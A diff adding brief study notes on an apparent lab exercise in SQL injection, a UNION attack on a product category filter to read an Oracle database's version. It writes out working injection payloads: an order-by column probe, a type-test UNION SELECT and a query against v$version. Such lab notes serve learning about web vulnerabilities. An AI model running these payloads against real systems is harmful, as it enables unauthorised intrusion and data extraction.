@@ -1,0 +1,22 @@
+Goal: Query the DB type and version using UNION attack 
+
+Attack place: Product category filter
+
+Step 1: Look for a field in the website that is vulnerable to SQL attach (eg: place a ' and look for 500 error)
+
+Vulnerable: GET /filter?category=Gifts'+order+by+3 HTTP/2 (don't forget to URL incode it)
+
+Analysis:
+1) Number of Columns in the table
+order by 3 - Internal server error - therefore only two column present
+
+2) Determine the Datatype of the Columns
+' UNION SELECT 'a', 'a' from DUAL-- => will throw a type mismatch error if this is not the correct type
+
+3) Ouput the version and database of the Oracle DB:
+(look at the cheatsheet for the SQL command)
+
+' UNION SELECT banner, NULL FROM v$version--
+
+(two columns because the number of columns has to be same in both the select statements in SQL)
+
